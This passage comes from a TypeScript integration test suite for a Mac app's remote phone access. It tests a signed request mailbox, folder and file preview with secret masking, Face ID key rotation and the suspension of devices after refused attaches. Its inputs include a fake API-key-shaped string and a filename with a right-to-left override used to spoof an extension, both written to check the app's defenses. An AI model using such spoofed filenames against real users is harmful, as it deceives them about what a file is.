		const typed = (prefix: string, length: number) => `/work 0 1000 ${prefix}${"t".repeat(length)}`;
		const echoOf = (conversation: number, from: number) =>
			remote.sessionLines.get(session)!.slice(from).find((line) => line.event === "conversation" && line.id === conversation && line.items.some((item: any) => item.kind === "user"));
		const opened = async () => {
			const { id } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
			await ask("conversation.open", { id, newestFirst: true });
			return id as number;
		};

		const otherFrom = remote.sessionLines.get(otherSession)!.length;
		// Just under: what the echo's wrapping takes is measured on a short message first, then the text fills the rest
		// but for 4 KiB.
		const under = await opened();
		const shortFrom = remote.sessionLines.get(session)!.length;
		// The short one from the phone, as a phone may send it; the long ones from the Mac.
		await ask("submit", { id: under, text: typed("", 1) });
		const shortEcho = await until("the short message's echo", () => echoOf(under, shortFrom));
		await until("the short message's answer", () => remote.sessionLines.get(session)!.slice(shortFrom).some((line) => line.event === "conversation" && JSON.stringify(line).includes("Done: I ran it 0 times")));
		const wrapping = Buffer.byteLength(JSON.stringify({ session, message: shortEcho })) - typed("", 1).length;
		const underText = typed("under ", MAX_LINE_TO_HELPER - wrapping - 4096 - typed("under ", 0).length);
		const underFrom = remote.sessionLines.get(session)!.length;
		assert.ok((await app.call("submit", { id: under, text: underText })).submissionId !== undefined, "a text just under is taken from the Mac");
		const underEcho = await until("the echo of a text just under 64 MiB", () => echoOf(under, underFrom));
		assert.equal(underEcho.items.find((item: any) => item.kind === "user").text, underText, "and comes back to the phone whole");
		assert.ok(remote.longest > MAX_LINE_TO_HELPER - 8192 && remote.longest <= MAX_LINE_TO_HELPER, `in a line of ${remote.longest} bytes`);

		// Over: taken from the Mac, and its echo not written.
		const over = await opened();
		const overText = typed("over ", 65 * 1024 * 1024);
		const overFrom = remote.sessionLines.get(session)!.length;
		const logFrom = engineLog.length;
		const overAnswer = await app.call("submit", { id: over, text: overText });
		assert.ok(overAnswer.submissionId !== undefined, `a text of 65 MiB from the Mac is taken: ${JSON.stringify(overAnswer).slice(0, 300)}`);
		const said = await until("the echo not written, in engine.log", () => engineLog.slice(logFrom).match(/remote: a device's conversation event of (\d+) bytes was not written to pi² Remote, which takes lines of at most (\d+)/) ?? undefined, {
			over: () => (remote.longest > MAX_LINE_TO_HELPER ? `pi² Remote was written a line of ${remote.longest} bytes` : undefined),
		});
		assert.ok(Number(said[1]) > MAX_LINE_TO_HELPER && Number(said[2]) === MAX_LINE_TO_HELPER, said[0]);
		assert.ok(!engineLog.slice(logFrom).includes("tttttttt"), "by its kind and size, nothing of what it held");
		assert.ok(!remote.closed && remote.longest <= MAX_LINE_TO_HELPER, `pi² Remote is written no line longer than it takes: ${remote.longest} bytes at most`);
		assert.equal(echoOf(over, overFrom), undefined, "the phone is sent no echo of it");
		assert.deepEqual((await ask("engine.info")).result, { build: null, pid: engine.pid }, "and its session goes on");
		assert.deepEqual((await remote.inSession(otherSession, "engine.info")).result, { build: null, pid: engine.pid }, "so does the other device's");
		const otherLongest = remote.sessionLines.get(otherSession)!.slice(otherFrom).reduce((most: any, line) => (JSON.stringify(line).length > JSON.stringify(most ?? null).length ? line : most), null);
		assert.ok(JSON.stringify(otherLongest).length < 1024 * 1024, `which was sent nothing of either text: ${JSON.stringify(otherLongest).slice(0, 300)} (${JSON.stringify(otherLongest).length})`);
		const open = app.devicesEvents.at(-1).sessions.map((one: any) => one.session);
		assert.ok(open.includes(session) && open.includes(otherSession), "both sessions are open on the Mac");
		// What the phone then sees of that conversation, opened again: nothing of its list while the message is among the
		// newest entries, since the first part, which holds it, is too long to send.
		await ask("conversation.close", { id: over });
		const againFrom = remote.sessionLines.get(session)!.length;
		assert.deepEqual((await ask("conversation.open", { id: over, newestFirst: true })).result, {}, "opened again, it is answered");
		await ask("engine.info");
		assert.ok(!remote.sessionLines.get(session)!.slice(againFrom).some((line) => String(line.event).startsWith("conversation") && line.id === over), "and sent nothing of its list");
		await app.call("devices.revoke", { device: other.id });
		step(`a typed text of 65 MiB from the Mac is taken and its echo to a phone (${said[1]} bytes) is not written to pi² Remote, which takes ${MAX_LINE_TO_HELPER}: the session and another device's go on; one just under comes back whole`);
	}

	// ---- The mailbox (5.3, 4.3; #678): a request a phone left, opened by pi² Remote, checked again and handled here
	{
		const leave = async (item: ReturnType<Phone["item"]>, id: string = JSON.parse(item.signed).nonce) => {
			const before = remote.events.length;
			return { before, reply: await remote.call("remote.mailboxIn", { device: phone.id, id, item }) };
		};
		const receipts = (before: number) => remote.events.slice(before).filter((event) => event.kind === "mailboxOut");
		const aborted = phone.item(remote.pairing, "abort", { id: 987_654 });
		const failed = await leave(aborted);
		assert.deepEqual(failed.reply.result, { taken: true, outcome: "failed" }, "an abort of no conversation is taken, and failed");
		const receipt = await remote.event("mailboxOut", failed.before);
		assert.equal(receipt.device, phone.id);
		assert.equal(receipt.item.kind, "receipt");
		assert.deepEqual(Object.keys(receipt.item.body), ["nonce", "method", "outcome", "why"]);
		assert.deepEqual([receipt.item.body.nonce, receipt.item.body.method, receipt.item.body.outcome], [JSON.parse(aborted.signed).nonce, "abort", "failed"], "the phone is left a receipt for its item");
		const again = await leave(aborted);
		assert.deepEqual(again.reply.result, { taken: true, outcome: "refused" }, "the same item again is refused, and taken: the relay may delete it");
		await app.call("engine.info");
		assert.equal(receipts(again.before).length, 0, "with no second receipt");
		const kept = await leave(phone.item(remote.pairing, "github.merge", { projectId: "p", number: 1 }));
		assert.deepEqual(kept.reply.result, { taken: true, outcome: "refused" }, "a request its row keeps from the mailbox is refused");
		const refusedReceipt = await remote.event("mailboxOut", kept.before);
		assert.deepEqual([refusedReceipt.item.body.outcome, refusedReceipt.item.body.why], ["refused", ONLY_ON_THE_MAC], "and its receipt says why");
		const moved = await leave(phone.item(remote.pairing, "abort", { id: 987_655 }), b64url(randomBytes(16)));
		assert.deepEqual(moved.reply.result, { taken: true, outcome: "refused" }, "an item whose nonce is not the id it was opened at is refused");
		assert.match((await remote.call("remote.mailboxIn", { device: phone.id, item: aborted })).error, /takes a device, an item's id and the item/);
		assert.match((await remote.call("remote.mailboxIn", { device: phone.id, id: b64url(randomBytes(16)), item: aborted, extra: 1 })).error, /takes a device, an item's id and the item/);
		await assert.rejects(app.call("remote.mailboxIn", { device: phone.id, id: b64url(randomBytes(16)), item: aborted }), (error: Error) => error.message === ONLY_FROM_THE_HELPER, "remote.mailboxIn on the engine's socket");
		// A widening request by mailbox is handled as a live one is, by the same function (#921's security read): on disk in
		// the devices' log before it is taken, and the person notified.
		// In a conversation of its own: always allows bash there from then on.
		const { id: mailed } = await app.call("conversation.create", { agentId: "forge" });
		await app.call("conversation.open", { id: mailed });
		await app.call("conversation.configure", { id: mailed, access: "ask", cwd: work });
		void app.call("submit", { id: mailed, text: "/bash echo left in the mailbox" });
		const byMail = await app.until("the approval to leave in the mailbox", () => app.events.inbox?.items?.find((item: any) => item.conversationId === mailed && item.kind === "approval"));
		const widenedBefore = app.devicesEvents.length;
		const widening = await leave(phone.item(remote.pairing, "inbox.decide", { id: byMail.id, decision: "always" }));
		assert.deepEqual(widening.reply.result, { taken: true, outcome: "done" }, "always on an approval, by mailbox, is taken and done");
		assert.ok(onDisk((entry) => entry.path === "mailbox" && entry.method === "inbox.decide" && entry.outcome === "done"), "its log entry is on disk when the engine answers taken");
		assert.match((await app.notice("widening", widenedBefore)).text, /^Alex's iPhone: Answered an approval: always/, "the Mac is told of a widening request left in the mailbox");
		// A fault of the engine's by mailbox (#895's catch): the fixed refusal in the receipt, taken, and the engine runs on.
		const faultsBefore = engineLog.length;
		const faulted = await leave(phone.item(remote.pairing, "inbox.answer", { id: "no-such", text: "x" }));
		assert.deepEqual(faulted.reply.result, { taken: true, outcome: "failed" }, "an item whose handling fails in the engine is taken, and failed");
		assert.equal((await remote.event("mailboxOut", faulted.before)).item.body.why, DEVICE_LINE_FAILED, "its receipt says so in fixed words");
		await until("the mailbox's fault in the engine's log", () => engineLog.slice(faultsBefore).includes("remote: a device's request failed in the engine: Error: PI2_DEVICE_FAULT"));
		assert.ok((await ask("engine.info")).result, "the engine still answers");
		assert.equal(engine.exitCode, null, "and still runs");
		const stated = await remote.call("remote.state", { relay: { available: false, state: "down", why: "the connection to the relay was lost", retryAt: Date.now() + 1_000 } });
		assert.deepEqual(stated.result, {});
		await app.until("the relay's state on the Devices page", () => app.devicesEvents.at(-1)?.helper?.relay?.state === "down");
		assert.match((await remote.call("remote.state", { relay: { available: "no" } })).error, /relay's state is not one/);
		assert.match((await remote.call("remote.state", { relay: { available: false, state: "gone" } })).error, /relay's state is not one/);
	}
	step("the mailbox: a request a phone left is checked again, handled on the path mailbox and taken, with a receipt left for the phone; the same item again is refused and taken with no receipt; remote.state carries the relay path's state to the Devices page; a widening request by mailbox is on disk before it is taken and the person is told; a fault by mailbox gets the fixed refusal");

	// ---- A new project's folder, and a file shown, from the phone (#698; engine/test/folders.ts has every refusal)
	{
		const used = realpathSync(mkdtempSync(join(work, "used-")));
		const neverUsed = realpathSync(mkdtempSync(join(work, "never-used-")));
		const inFile = "sk-ant-api03-aKeyShapedStringInAFileShown0123456789";
		writeFileSync(join(used, "notes.md"), `notes, and ${inFile}\n`);
		const { id: linking } = await app.call("conversation.create", { model: { provider: "demo", modelId: "demo-1" } });
		await app.call("conversation.configure", { id: linking, cwd: used });
		await app.call("conversation.open", { id: linking });
		await app.call("submit", { id: linking, text: "[the notes](notes.md)" });
		await app.until("the answer linking the notes", () => app.conversations.get(linking)?.items.some((item: any) => item.kind === "assistant" && item.text.includes("(notes.md)")));
		const offered = (await ask("projects.folders")).result.folders.map((folder: any) => folder.path);
		assert.ok(offered.includes(used) && !offered.includes(neverUsed) && !offered.includes(join(work, "..")), "a folder used with pi², never one unused nor a parent");
		// The device row refuses a folder not offered by its exact text, before any handler, whatever projects.ts does.
		assert.equal((await ask("projects.create", { folder: neverUsed })).error, ONLY_ON_THE_MAC, "a folder the Mac does not offer");
		assert.equal((await ask("projects.create", { folder: join(used, "..", "..") })).error, ONLY_ON_THE_MAC, "nor a parent of one");
		symlinkSync(used, join(work, "link-to-used"));
		assert.equal((await ask("projects.create", { folder: join(work, "link-to-used") })).error, ONLY_ON_THE_MAC, "nor a link to one: the text is compared");
		assert.equal((await ask("projects.create", { folder: `${used}/` })).error, ONLY_ON_THE_MAC, "nor another text for one");
		const fromPhone = (await ask("projects.create", { folder: used })).result;
		const listed = await app.until("the phone's project", () => app.events.projects?.projects?.find((project: any) => project.id === fromPhone.id));
		assert.equal(listed.folder, used, "a folder offered, as it was offered");
		// Offered, then gone before the project is made: the handler's own check against what is offered now refuses it
		// (without that check, the engine's would say "Not a folder" and name it).
		const goneSince = realpathSync(mkdtempSync(join(work, "gone-since-")));
		const { id: there } = await app.call("conversation.create", { model: { provider: "demo", modelId: "demo-1" } });
		await app.call("conversation.configure", { id: there, cwd: goneSince });
		assert.ok((await ask("projects.folders")).result.folders.some((folder: any) => folder.path === goneSince));
		rmSync(goneSince, { recursive: true });
		assert.equal((await ask("projects.create", { folder: goneSince })).error, NOT_OFFERED, "checked again as the project is made");
		const shown = (await ask("files.preview", { id: linking, path: "notes.md" })).result;
		assert.equal(shown.text, `notes, and ${KEY_HIDDEN}\n`, "masked, as everything sent to a phone is");
		assert.equal((await ask("files.preview", { id: linking, path: "other.md" })).error, NOT_LINKED);
		assert.equal((await ask("files.preview", { id: linking, path: "evil\u202Etxt.md" })).error, NOT_LINKED);
		const logged = (await app.call("devices.log", { device: phone.id })).entries;
		assert.ok(logged.some((entry: any) => entry.method === "files.preview" && entry.summary.startsWith("Showed the file “evilt")), "a path with a right-to-left override is logged without it (#902)");
		assert.ok(!JSON.stringify(logged).includes("\\u202e") && !logged.some((entry: any) => /[\u202A-\u202E]/.test(entry.summary)), "anywhere in the log");
		assert.ok(logged.some((entry: any) => entry.method === "files.preview" && entry.outcome === "done" && entry.summary.startsWith("Showed the file “notes.md”")), "a file shown is logged, by its path from the folder");
		assert.ok(logged.some((entry: any) => entry.method === "projects.create" && entry.outcome === "refused" && entry.why === ONLY_ON_THE_MAC), "a folder refused by the table");
		assert.ok(logged.some((entry: any) => entry.method === "projects.create" && entry.outcome === "failed" && entry.why === NOT_OFFERED), "and one refused as it was made");
		assert.ok(!logged.some((entry: any) => entry.method === "projects.folders"), "asking for the folders is reading");
		step("from the phone: the folders offered, a project made from one by its exact text, refused by the device row from any other (a link to one, a parent) and by the handler from one gone since, a linked file shown masked, and logged");
	}

	// ---- Presenting's requests from the phone (#963): presented.picture passes the device row to the stub; the others
	// are refused before any handler, with the words every request kept to the Mac gets, and logged as refused.
	{
		const picture = { id: 1, presentation: "p", version: 1, item: 0 };
		assert.equal((await ask("presented.picture", picture)).error, PRESENTING_NOT_YET, "presented.picture reaches its handler");
		const macOnly = ["present.register", "present.drawn", "presented.list", "presented.file", "presented.network"];
		for (const method of macOnly) assert.equal((await ask(method, { ...picture, path: "index.html", allow: true, requestId: "r", ok: true })).error, ONLY_ON_THE_MAC, method);
		for (const method of ["presented.picture", ...macOnly]) await assert.rejects(app.call(method, picture), new RegExp(PRESENTING_NOT_YET), `${method} from the app reaches the stub`);
		const logged = (await app.call("devices.log", { device: phone.id })).entries;
		for (const method of macOnly) assert.ok(logged.some((entry: any) => entry.method === method && entry.outcome === "refused" && entry.why === ONLY_ON_THE_MAC), `${method} logged as refused`);
		assert.ok(!logged.some((entry: any) => entry.method === "presented.picture"), "presented.picture is reading, and not logged");
		step("from the phone: presented.picture passes its row to the stub, unlogged; present.register, present.drawn, presented.list, presented.file and presented.network are refused as the Mac's, and logged; the app reaches the stub with all six");
	}

	// ---- Resume, refusals, suspension (3.4, 3.6, 5.8)
	const resumed = await attach({ session });
	assert.deepEqual(resumed.reply.result, { session, resume: true }, "a resume, with a new signature over a new channel");
	const used = await attach({ session, challenge: resumed.challenge });
	assert.match(used.reply.error, /not one this Mac issued, or was used/);
	assert.equal(used.reply.data, undefined, "a refusal with no reason for the phone carries none (#818)");
	// Signed by a stranger's key: refused, and never counted against the device, however many.
	for (let i = 0; i < 6; i++) {
		const stranger = (await attach({ device: p256().privateKey })).reply;
		assert.match(stranger.error, /not signed by the device key/);
		assert.equal(stranger.data, undefined);
	}
	await app.call("engine.info");
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id).suspendedAt, null, "six attaches a stranger signed do not suspend the device");
	// Each refusal the phone can act on carries its reason beside the words, which pi² Remote never reads (#818).
	const wrongPresence = (await attach({ presence: p256().privateKey })).reply;
	assert.match(wrongPresence.error, /presence signature is not the presence key's/);
	assert.deepEqual(wrongPresence.data, { reason: "presence" });
	const noPresence = (await attach({ presence: null })).reply;
	assert.match(noPresence.error, /presence signature/, "a presence signature missing");
	assert.deepEqual(noPresence.data, { reason: "presence" });
	const stale = (await attach({ at: Date.now() - 3 * 60_000 })).reply;
	assert.match(stale.error, /more than two minutes/);
	assert.deepEqual(stale.data, { reason: "clock" });
	const old = Object.assign(Object.create(Phone.prototype) as Phone, phone, { build: "0" });
	const oldChallenge = (await remote.call("remote.attachBegin")).result.challenge;
	const oldChannel = randomBytes(32);
	const tooOld = await remote.call("remote.attach", { attach: old.attach({ pairing: remote.pairing, challenge: oldChallenge, binding: oldChannel }), binding: b64url(oldChannel), path: "relay" });
	assert.match(tooOld.error, /too old for this Mac/);
	assert.deepEqual(tooOld.data, { reason: "update" });
	const closedBefore = remote.events.length;
	const wrongChannel = randomBytes(32);
	const challengeNow = (await remote.call("remote.attachBegin")).result.challenge;
	const otherChannel = await remote.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge: challengeNow, binding: randomBytes(32) }), binding: b64url(wrongChannel), path: "relay" });
	assert.match(otherChannel.error, /signed for another channel/);
	assert.match((await app.notice("suspended")).text, /Alex's iPhone was suspended after 5 refused/);
	assert.equal((await remote.event("sessionClosed", closedBefore)).session, session, "its session closed at once");
	const whileSuspended = (await attach()).reply;
	assert.match(whileSuspended.error, /suspended/, "a good attach is refused while it is suspended");
	assert.deepEqual(whileSuspended.data, { reason: "suspended" });
	const strangerSuspended = (await attach({ device: p256().privateKey })).reply;
	assert.match(strangerSuspended.error, /suspended/);
	assert.equal(strangerSuspended.data, undefined, "one the device key did not sign is told no reason");
	assert.match((await offer(p256())).error, /suspended/, "and an offer of a new Face ID key");
	assert.equal((await remote.inSession(session, "engine.info")).error, OPEN_WITH_FACE_ID);
	await app.call("devices.resume", { device: phone.id });
	const again = await attach({ session });
	assert.equal(again.reply.result.resume, false, "a session that ended cannot be resumed");
	const session2 = again.reply.result.session as string;
	assert.notEqual(session2, session);
	step("a resume is a new attach; a stranger's signature is refused and never counted; a used challenge, a wrong or missing presence signature, a stale time and another channel are refused, and five suspend the device until the Mac resumes it; an old build, a presence signature, the clock and a suspension carry their reason for the phone, and nothing else does");

	// ---- The end of a session (4.5) and the log (4.4)
	await until("the second session's greeting", () => remote.sessionLines.get(session2)?.some((line) => line.event === "device"));
	const ended = remote.events.length;
	assert.deepEqual((await remote.call("remote.sessionEnd", { session: session2 })).result, {});
	assert.equal((await remote.event("sessionClosed", ended)).session, session2);
	assert.equal((await remote.inSession(session2, "engine.info")).error, OPEN_WITH_FACE_ID, "the session is closed at once");
	assert.equal((await attach({ session: session2 })).reply.result.resume, false, "and cannot be resumed");
	const { entries } = await app.call("devices.log", { device: phone.id });
	const kinds = entries.map((entry: any) => `${entry.method}:${entry.outcome}`);
	for (const kind of ["pair:done", "attach:done", "resume:done", "resume:refused", "attach:refused", "suspend:done", "agents.allowEverything:refused", "providers.setKey:refused", "usage.setBudget:done", "submit:done"]) {
		assert.ok(kinds.includes(kind), `the log has ${kind}: ${kinds.join(" ")}`);
	}
	assert.ok(!kinds.some((kind: string) => kind.startsWith("engine.info") || kind.startsWith("conversation.open")), "reading is not logged");
	assert.equal(entries.find((entry: any) => entry.method === "submit").summary, "Sent a message", "a summary says what, never the message");
	assert.ok(!JSON.stringify(entries).includes(typed), "and nothing key-shaped");
	assert.ok(!entries.some((entry: any) => entry.why?.includes("not signed by the device key")), "what a stranger signed is not in the log");
	const unknown = entries.find((entry: any) => entry.method === "unknown");
	assert.ok(unknown !== undefined && unknown.summary.length <= 200 && !JSON.stringify(entries).includes("x".repeat(300)), "a method no list places is logged as unknown, cut short");
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		const saved = (await app.call("devices.log", { device: phone.id })).entries.filter((entry: any) => entry.method === "mcp.save");
		if (saved.length === 1 && saved[0].count === 3) break;
		assert.ok(saved.length === 1 && Date.now() < deadline, `the same refusal three times is one entry: ${JSON.stringify(saved)}`);
	}
	step("sessionEnd closes the session at once; the log has the pairing, attaches, resumes, refusals, the suspension and the requests, not the reading");

	// ---- A new Face ID key (3.2, 4.3, 4.4; #786): it waits, signs nothing, and only the Mac accepts or refuses it
	const recordOf = () => app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id);
	const oldPresence = spki(phone.presence.publicKey);
	const opened2 = await attach();
	const faceSession = opened2.reply.result.session as string;
	await until("the session's greeting", () => remote.sessionLines.get(faceSession)?.some((line) => line.event === "device"));
	await assert.rejects(app.call("remote.presenceKey", {}), (error: Error) => error.message === ONLY_FROM_THE_HELPER, "an offer on the engine's socket");
	const renewed = p256();
	assert.match((await offer(renewed, { device: p256().privateKey })).error, /not signed by the device key/, "an offer a stranger signed");
	assert.match((await offer(renewed, { signer: p256().privateKey })).error, /not signed by the key it offers/, "an offer of a key the phone does not hold");
	assert.equal(recordOf().pendingPresenceKey, null, "neither waits");
	// The offer's own refusals (the security read's M3). Each counted one is followed by a resume on the Mac, which
	// clears the count, so that they do not suspend the device here.
	const refusedOffer = async (reply: any, expected: RegExp, what: string, counted = true) => {
		assert.match(reply.error ?? "", expected, what);
		if (counted) await app.call("devices.resume", { device: phone.id });
	};
	await refusedOffer(await offer(renewed, { challenge: opened2.challenge }), /challenge is not one this Mac issued, or was used/, "a used challenge");
	await refusedOffer(await offer(renewed, { challenge: b64url(randomBytes(32)) }), /challenge is not one this Mac issued/, "a challenge never issued");
	await refusedOffer(await offer(renewed, { signedBinding: randomBytes(32) }), /signed for another channel/, "another channel's binding");
	await refusedOffer(await offer(renewed, { at: Date.now() - 3 * 60_000 }), /more than two minutes/, "three minutes behind");
	await refusedOffer(await offer(renewed, { at: Date.now() + 3 * 60_000 }), /more than two minutes/, "three minutes ahead");
	await refusedOffer(await offer(renewed, { pairing: b64url(randomBytes(16)) }), /another pairing/, "another pairing");
	await refusedOffer(await offer(renewed, { edit: (line) => (line.signed = line.signed.replace('"kind":"presenceKey"', '"kind":"attach"')) }), /not an offer of a Face ID key/, "another kind", false);
	await refusedOffer(await offer(renewed, { edit: (line) => (line.extra = true) }), /offer line is not one/, "a field it does not know", false);
	const p384 = generateKeyPairSync("ec", { namedCurve: "P-384" });
	await refusedOffer(await offer(renewed, { presenceKey: spki(p384.publicKey), signer: p384.privateKey }), /not a P-256 key/, "a P-384 key");
	await refusedOffer(await offer(renewed, { presenceKey: compressed(renewed.publicKey) }), /not a P-256 key/, "a compressed P-256 key");
	await refusedOffer(await offer(renewed, { presenceKey: compressed(phone.device.publicKey), signer: phone.device.privateKey }), /not a P-256 key/, "the device key, compressed");
	await refusedOffer(await offer(renewed, { presenceKey: spki(phone.device.publicKey), signer: phone.device.privateKey }), /is the device key/, "the device key");
	await refusedOffer(await offer(renewed, { build: "x" }), /names no build/, "no build");
	await refusedOffer(await offer(renewed, { build: "0" }), /too old for this Mac/, "a build below the minimum", false);
	// The key in use offered again is answered as accepted, so a phone can learn it, without counting or logging.
	assert.deepEqual((await offer(phone.presence)).result, { accepted: true }, "the key in use");
	assert.equal(recordOf().pendingPresenceKey, null, "none of these waits");
	assert.equal(recordOf().suspendedAt, null, "nor is the device suspended");
	const beforeOffer = app.devicesEvents.length;
	assert.deepEqual((await offer(renewed)).result, { waiting: true });
	const faceNotice = await app.notice("presenceKey", beforeOffer);
	assert.equal(faceNotice.device, phone.id);
	assert.equal(faceNotice.text, "Face ID was set up again on Alex's iPhone. Accept the new key in Settings › Devices only if you did it yourself.");
	assert.equal(recordOf().pendingPresenceKey, spki(renewed.publicKey), "the offered key waits");
	assert.equal(recordOf().presenceKey, oldPresence, "and the key in use is unchanged");
	assert.ok(!JSON.stringify(remote.sessionLines.get(faceSession)).includes("Face ID was set up again"), "the notice goes to the app alone, never to a device");
	// The same key again is answered as waiting, with no second notice; another key never takes its place.
	const beforeAgain = app.devicesEvents.length;
	assert.deepEqual((await offer(renewed)).result, { waiting: true });
	assert.equal((await offer(p256())).error, PRESENCE_KEY_ALREADY_WAITS, "a second offer does not replace the first unseen");
	await app.call("engine.info");
	assert.ok(!app.devicesEvents.slice(beforeAgain).some((event) => event.notice?.kind === "presenceKey"), "no second notice");
	assert.equal(recordOf().pendingPresenceKey, spki(renewed.publicKey), "the first still waits");
	// The old key keeps working while a new one waits: refusing must leave the phone as it was.
	assert.equal((await attach()).reply.result.resume, false, "the key in use still attaches while a new one waits");
	// A waiting key signs nothing: an attach under it is refused, with words that say why.
	assert.equal((await attach({ presence: renewed.privateKey })).reply.error, PRESENCE_KEY_WAITS, "an attach signed by the waiting key");
	// A device cannot accept or refuse it, its own or another's: refused by the lists, with ONLY_ON_THE_MAC's words.
	for (const method of ["devices.acceptPresenceKey", "devices.refusePresenceKey"]) {
		assert.equal((await remote.inSession(faceSession, method, { device: phone.id })).error, ONLY_ON_THE_MAC, method);
		assert.equal((await remote.inSession(faceSession, method, { device: "dev_another" })).error, ONLY_ON_THE_MAC, `${method} for another`);
	}
	// Nor can it write the log's own entries by naming them: refused, and logged as "unknown".
	for (const method of ["presenceKey", "pair", "suspend"]) assert.equal((await remote.inSession(faceSession, method, {})).error, ONLY_ON_THE_MAC, method);
	assert.equal(recordOf().pendingPresenceKey, spki(renewed.publicKey), "still waiting");
	// Accepting: the key replaced in one commit, pi² Remote told the new key, then the session opened under the old one closed.
	const beforeAccept = remote.events.length;
	assert.deepEqual(await app.call("devices.acceptPresenceKey", { device: phone.id }), {});
	assert.deepEqual(await remote.event("presenceKey", beforeAccept), { event: "remote", kind: "presenceKey", device: phone.id, presenceKey: spki(renewed.publicKey) });
	await until("the sessions opened under the old key closed", () => remote.events.slice(beforeAccept).some((event) => event.kind === "sessionClosed" && event.session === faceSession));
	const toldAccept = remote.events.slice(beforeAccept).map((event) => event.kind);
	assert.ok(toldAccept.indexOf("presenceKey") < toldAccept.indexOf("sessionClosed"), `pi² Remote is told the key before the session closes: ${toldAccept.join(" ")}`);
	await app.until("the new key in the record", () => recordOf().presenceKey === spki(renewed.publicKey) && recordOf().pendingPresenceKey === null);
	assert.equal((await remote.inSession(faceSession, "engine.info")).error, OPEN_WITH_FACE_ID, "the old session is over");
	await assert.rejects(app.call("devices.acceptPresenceKey", { device: phone.id }), /No new Face ID key waits/);
	assert.match((await attach()).reply.error, /presence signature is not the presence key's/, "the old key signs nothing now");
	// Five genuine items a relay held back, signed under the old key within the hour, delivered now (#891): each refused,
	// with its receipt, and the device not suspended, though the attach above counted.
	for (let i = 0; i < 5; i++) {
		const held = phone.item(remote.pairing, "submit", { id: 4, text: `held back ${i}` }, { at: Date.now() - 30 * 60_000 });
		const before = remote.events.length;
		assert.deepEqual((await remote.call("remote.mailboxIn", { device: phone.id, id: JSON.parse(held.signed).nonce, item: held })).result, { taken: true, outcome: "refused" });
		const { body } = (await remote.event("mailboxOut", before)).item;
		assert.deepEqual([body.outcome, body.why], ["refused", "The item's presence signature is not the presence key's."], "its receipt says why");
	}
	await app.call("engine.info");
	assert.equal(recordOf().suspendedAt, null, "five held-back items under the old key do not suspend the device");
	phone.presence = renewed;
	const underNew = await attach();
	assert.equal(underNew.reply.result.resume, false, "the new key opens a session");
	assert.deepEqual((await offer(renewed)).result, { accepted: true }, "and offered again, is answered as accepted");
	// Refusing: the waiting key dropped, the key in use kept.
	const refusedKey = p256();
	assert.deepEqual((await offer(refusedKey)).result, { waiting: true });
	assert.deepEqual(await app.call("devices.refusePresenceKey", { device: phone.id }), {});
	await app.until("the waiting key dropped", () => recordOf().pendingPresenceKey === null);
	assert.equal(recordOf().presenceKey, spki(renewed.publicKey));
	await assert.rejects(app.call("devices.refusePresenceKey", { device: phone.id }), /No new Face ID key waits/);
	await assert.rejects(app.call("devices.acceptPresenceKey", { device: "dev_none" }), /No such device is paired/);
	const faceLog = (await app.call("devices.log", { device: phone.id })).entries;
	const faceKinds = faceLog.map((entry: any) => `${entry.method}:${entry.outcome}`);
	for (const kind of ["presenceKey:done", "presenceKey:refused", "devices.acceptPresenceKey:done", "devices.refusePresenceKey:done", "devices.acceptPresenceKey:refused", "devices.refusePresenceKey:refused"]) {
		assert.ok(faceKinds.includes(kind), `the log has ${kind}: ${faceKinds.join(" ")}`);
	}
	assert.equal(faceLog.filter((entry: any) => entry.method === "presenceKey" && entry.outcome === "done").length, 2, "two offers taken, the one offered again not logged twice");
	assert.deepEqual(faceLog.find((entry: any) => entry.method === "devices.acceptPresenceKey" && entry.outcome === "done").summary, "Its new Face ID key was accepted on the Mac");
	assert.deepEqual(faceLog.find((entry: any) => entry.method === "presenceKey" && entry.outcome === "refused" && entry.why === PRESENCE_KEY_ALREADY_WAITS)?.summary, "Offered a new Face ID key");
	assert.ok(!faceLog.some((entry: any) => entry.why?.includes("not signed by the device key")), "what a stranger signed is not in the log");
	assert.ok(!faceLog.some((entry: any) => ["presenceKey", "pair", "suspend"].includes(entry.method) && entry.why === ONLY_ON_THE_MAC), "a device's request by the log's own names is not logged under them");
	assert.ok(faceLog.some((entry: any) => entry.method === "unknown" && entry.why === ONLY_ON_THE_MAC), "but as unknown");
	assert.equal(recordOf().suspendedAt, null, "and the device is not suspended");
	step("a new Face ID key waits, signs nothing and is told to the app alone; a second cannot replace it; a device cannot accept or refuse one; accepting replaces the key, tells pi² Remote, then ends the session; refusing drops it; the log has each");

	// ---- An offer's refusals carry the reasons an attach's would (#891), with the same words, counting and log
	const offerRefusal = (reply: any) => [reply.error, reply.data?.reason];
	// Refused offers in the log, the same refusal again counted in its entry (`count`).
	const refusedOffers = async () =>
		((await app.call("devices.log", { device: phone.id })).entries as any[]).filter((entry) => entry.method === "presenceKey" && entry.outcome === "refused").reduce((sum, entry) => sum + (entry.count ?? 1), 0);
	// A build below the minimum: `update`, not counted (five do not suspend), not logged.
	const beforeUpdate = await refusedOffers();
	for (let i = 0; i < 5; i++) assert.deepEqual(offerRefusal(await offer(p256(), { build: "0" })), ["This build of pi² for iPhone is too old for this Mac. Update it.", "update"], "a build below the minimum is told update");
	await app.call("engine.info");
	assert.equal(recordOf().suspendedAt, null, "five offers from a build too old do not suspend the device");
	assert.equal(await refusedOffers(), beforeUpdate, "nor are they logged");
	// Another key while one waits: no reason, never `presence`, since the key that waits is not this phone's; counted and
	// logged as before.
	const waitingKey = p256();
	assert.deepEqual((await offer(waitingKey)).result, { waiting: true });
	const beforeSecond = await refusedOffers();
	assert.deepEqual(offerRefusal(await offer(p256())), [PRESENCE_KEY_ALREADY_WAITS, undefined], "a second key while one waits is told no reason");
	assert.equal(await refusedOffers(), beforeSecond + 1, "and logged as refused");
	assert.deepEqual(await app.call("devices.refusePresenceKey", { device: phone.id }), {});
	// Other refusals still carry no reason.
	const usedChallenge = (await remote.call("remote.attachBegin")).result.challenge;
	await offer(p256(), { challenge: usedChallenge, at: Date.now() - 3 * 60_000 });
	const noReason = await offer(p256(), { challenge: usedChallenge });
	assert.match(noReason.error, /challenge is not one this Mac issued, or was used/);
	assert.equal(noReason.data, undefined, "a used challenge is told no reason");
	assert.equal((await offer(p256(), { device: p256().privateKey })).data, undefined, "nor an offer a stranger signed");
